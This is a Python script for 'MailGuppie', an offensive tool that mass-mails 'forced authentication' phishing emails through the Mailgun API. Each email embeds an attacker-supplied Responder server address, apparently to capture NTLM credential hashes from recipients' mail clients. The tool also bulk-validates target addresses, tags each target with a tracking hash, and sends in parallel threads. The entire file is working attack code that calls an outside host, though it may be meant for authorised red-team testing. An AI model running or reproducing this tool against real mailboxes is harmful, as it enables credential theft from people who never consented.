#!/usr/bin/env python3
"""
MailGuppie - Mailgun API Email Sender
Sends forced authentication emails to a list of targets using the Mailgun API
"""

import argparse
import requests
import hashlib
import re
import time
import csv
import io
import zipfile
import random
import string
import json
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


def generate_sha3_hash(email):
    """Generate SHA3-256 hash and return middle 20 characters"""
    hasher = hashlib.sha3_256()
    hasher.update(email.encode('utf-8'))
    hash_hex = hasher.hexdigest()
    # Extract 20 characters from middle (chars 22-42)
    return hash_hex[22:42]


def extract_domain(email):
    """Extract domain from email address"""
    return email.split('@')[1] if '@' in email else None


def load_api_key(key_path):
    """Load API key from config file"""
    with open(key_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                return line
    return None


def parse_template(template_path):
    """Parse the email template and extract variables"""
    with open(template_path, 'r') as f:
        content = f.read()
    
    # Extract variables section (lines starting with # at the top)
    lines = content.split('\n')
    variables = {}
    template_start = 0
    
    for i, line in enumerate(lines):
        if line.strip().startswith('#'):
            # Parse variable: # VAR_NAME: value
            match = re.match(r'#\s*(\w+):\s*(.+)', line)
            if match:
                var_name, var_value = match.groups()
                variables[var_name.strip()] = var_value.strip()
        elif line.strip() and not line.strip().startswith('#'):
            template_start = i
            break
    
    # Get template content (everything after variables)
    template_html = '\n'.join(lines[template_start:])
    
    return variables, template_html


def replace_template_variables(html, variables, target_email, hash_value):
    """Replace all template variables in the HTML"""
    replacements = {
        '<SHA3_HASH>': hash_value,
        '<TARGET_EMAIL>': target_email,
        **{f'<{k}>': v for k, v in variables.items()}
    }
    
    result = html
    for placeholder, value in replacements.items():
        result = result.replace(placeholder, value)
    
    return result


def send_email(target, domain, api_key, sender_email, sender_name, subject, html_template, variables):
    """Send a single email via Mailgun API"""
    try:
        # Generate hash for this target
        hash_value = generate_sha3_hash(target)
        
        # Replace template variables
        html_body = replace_template_variables(html_template, variables, target, hash_value)
        
        # Format sender with name
        from_field = f"{sender_name} <{sender_email}>"
        
        # Send via Mailgun API
        response = requests.post(
            f"https://api.mailgun.net/v3/{domain}/messages",
            auth=("api", api_key),
            data={
                "from": from_field,
                "to": target,
                "subject": subject,
                "html": html_body
            },
            timeout=10
        )
        
        if response.status_code == 200:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] Target: {target}\tHash: {hash_value}\tTime: {timestamp}")
            return True, target
        else:
            print(f"[-] Error sending to {target}: {response.status_code} - {response.text}")
            return False, target
            
    except Exception as e:
        print(f"[-] Error sending to {target}: {str(e)}")
        return False, target


def submit_bulk_validation(emails_list, list_name, api_key):
    """Submit emails for bulk validation"""
    url = f"https://api.mailgun.net/v4/address/validate/bulk/{list_name}"
    csv_buffer = io.StringIO()
    writer = csv.writer(csv_buffer)
    writer.writerow(['email'])
    writer.writerows([[email] for email in emails_list])
    csv_buffer.seek(0)
    files = {'file': ('emails.csv', csv_buffer, 'text/csv')}
    response = requests.post(url, auth=("api", api_key), files=files, timeout=30)
    return response


def get_bulk_status(list_name, api_key):
    """Check status of bulk validation"""
    url = f"https://api.mailgun.net/v4/address/validate/bulk/{list_name}"
    response = requests.get(url, auth=("api", api_key), timeout=30)
    return response


def download_results(download_url):
    """Download and parse validation results"""
    response = requests.get(download_url, timeout=30)
    if response.status_code == 200:
        with zipfile.ZipFile(io.BytesIO(response.content)) as z:
            file_list = z.namelist()
            for file in file_list:
                if file.endswith('.json'):
                    with z.open(file) as f:
                        results = json.load(f)
                    return results, 'json'
                elif file.endswith('.csv'):
                    with z.open(file) as f:
                        csv_content = f.read().decode('utf-8')
                        csv_reader = csv.DictReader(io.StringIO(csv_content))
                        results = list(csv_reader)
                    return results, 'csv'
    return None, None


def validate_emails(emails_list, api_key):
    """Validate email list using Mailgun bulk validation"""
    print("[*] Validating emails, this may take a few moments...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M")
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    list_name = f"validation_{timestamp}_{random_str}"
    
    submit_resp = submit_bulk_validation(emails_list, list_name, api_key)
    if submit_resp.status_code != 202:
        print(f"[-] Error uploading file: {submit_resp.status_code}")
        return None
    
    start_time = time.time()
    timeout = 300
    results = None
    file_type = None
    
    while True:
        time.sleep(5)
        status_resp = get_bulk_status(list_name, api_key)
        if status_resp.status_code == 200:
            data = status_resp.json()
            status = data.get('status', 'unknown').lower()
            download_url = data.get('download_url', {}).get('csv') or data.get('download_url', {}).get('json')
            if download_url:
                results, file_type = download_results(download_url)
                if results:
                    break
                else:
                    print("[-] Failed to process results.")
                    return None
            elif status == 'failed':
                print(f"[-] Job failed: {data.get('error', 'Unknown error')}")
                return None
        else:
            print(f"[-] Error checking status: {status_resp.status_code}")
            return None
        if time.time() - start_time > timeout:
            print("[-] Job timed out after 5 minutes. Check Mailgun dashboard.")
            return None
    
    # Process results
    valid_emails = []
    
    for result in results:
        email = result.get('address') or result.get('email', '')
        if not email:
            continue
        val_result = result
        if file_type == 'csv':
            result_value = val_result.get('result', val_result.get('Result', '')).lower()
        else:
            result_value = val_result.get('result', '').lower()
        
        if result_value == 'deliverable':
            risk = val_result.get('risk', 'low').lower()
            if risk == 'low':
                valid_emails.append(email)
    
    return valid_emails


def main():
    banner = """
╔════════════════════════════════════════════════╗
║                  MailGuppie                    ║
╚════════════════════════════════════════════════╝

          ><((((º>   ><((((º>   ><((((º>
"""
    
    # Show help if no arguments provided
    if len(sys.argv) == 1:
        print(banner)
        parser = argparse.ArgumentParser(
            usage='%(prog)s -t <targets.txt> -r <responder-ip> [options]',
            formatter_class=argparse.RawDescriptionHelpFormatter
        )
        parser.add_argument('-t', '--targets', required=True, help='Target email list file (.txt)', metavar='<targets.txt>')
        parser.add_argument('-r', '--responder', required=True, help='Responder server IP/hostname', metavar='<responder-ip>')
        parser.add_argument('-c', '--config', default='config/template.conf', help='Template config file (default: config/template.conf)', metavar='<template.conf>')
        parser.print_help()
        return
    
    parser = argparse.ArgumentParser(
        usage='%(prog)s -t <targets.txt> -r <responder-ip> [options]',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-t', '--targets', required=True, help='Target email list file (.txt)', metavar='<targets.txt>')
    parser.add_argument('-r', '--responder', required=True, help='Responder server IP/hostname', metavar='<responder-ip>')
    parser.add_argument('-c', '--config', default='config/template.conf', help='Template config file (default: config/template.conf)', metavar='<template.conf>')
    
    args = parser.parse_args()
    
    print(banner)
    
    # Load API key from config/key.conf
    key_path = Path('config/key.conf')
    if not key_path.exists():
        print(f"[-] Error: API key file not found at {key_path}")
        return
    
    api_key = load_api_key(key_path)
    if not api_key:
        print(f"[-] Error: Could not load API key from {key_path}")
        return
    
    # Load template from config file
    template_path = Path(args.config)
    if not template_path.exists():
        print(f"[-] Error: Template not found at {template_path}")
        return
    
    print(f"[*] Loading template: {template_path}")
    variables, html_template = parse_template(template_path)
    
    # Add responder from command line argument
    variables['RESPONDER'] = args.responder
    
    # Get required variables from template
    sender_email = variables.get('SENDER')
    sender_name = variables.get('SENDER_NAME', '')
    subject = variables.get('SUBJECT', 'No Subject')
    
    if not sender_email:
        print("[-] Error: SENDER not specified in template")
        return
    
    # Extract domain from sender email
    domain = extract_domain(sender_email)
    if not domain:
        print("[-] Error: Invalid sender email address in template")
        return
    
    print(f"[*] Email sender: {sender_name} <{sender_email}>")
    print(f"[*] Email subject: {subject}")
    
    # Read target list
    with open(args.targets, 'r') as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(targets)} targets")
    
    # Ask user if they want to validate emails
    validate_choice = input("[?] Would you like to first validate the target email list using the Mailgun Bulk Email Validation Tool? (y/n): ").strip().lower()
    
    if validate_choice == 'y':
        validated_targets = validate_emails(targets, api_key)
        if validated_targets is None:
            print("[-] Validation failed. Exiting.")
            return
        if len(validated_targets) == 0:
            print("[-] No valid low-risk emails found. Exiting.")
            return
        
        # Ask for confirmation before sending
        proceed = input(f"[?] {len(validated_targets)} valid low-risk emails identified. Proceed with sending? (y/n): ").strip().lower()
        if proceed != 'y':
            print("[*] Send cancelled by user.")
            return
            
        targets = validated_targets
        print(f"[*] Sending to {len(targets)} validated targets...")
    else:
        print("[*] Skipping validation...")
    
    print("[*] Starting send...")
    
    # Send emails with thread pool
    success_count = 0
    fail_count = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(
                send_email,
                target,
                domain,
                api_key,
                sender_email,
                sender_name,
                subject,
                html_template,
                variables
            ): target for target in targets
        }
        
        for future in as_completed(futures):
            success, target = future.result()
            if success:
                success_count += 1
            else:
                fail_count += 1
    
    print(f"\n[*] Complete! Success: {success_count}, Failed: {fail_count}")


if __name__ == "__main__":
    main()
